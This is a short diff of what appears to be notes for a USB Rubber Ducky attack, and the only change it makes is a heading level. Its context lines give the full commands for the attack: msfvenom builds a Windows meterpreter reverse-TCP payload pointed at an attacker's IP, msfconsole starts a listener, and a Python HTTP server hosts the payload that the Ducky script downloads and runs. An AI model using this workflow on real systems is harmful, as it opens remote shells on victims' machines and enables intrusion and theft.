@@ -7,7 +7,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=AttacksersIP LPORT=Attacke
 msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost IP; set lport PORT; set ExitOnSession false; exploit -j"<br/>
 ### Start python http server<br/>
 python3 -m http.server 80<br/>
-#### Ducky script will download and execute powershell script opening meterpreter session<br/>
+### Ducky script will download and execute powershell script opening meterpreter session<br/>
 
 
 
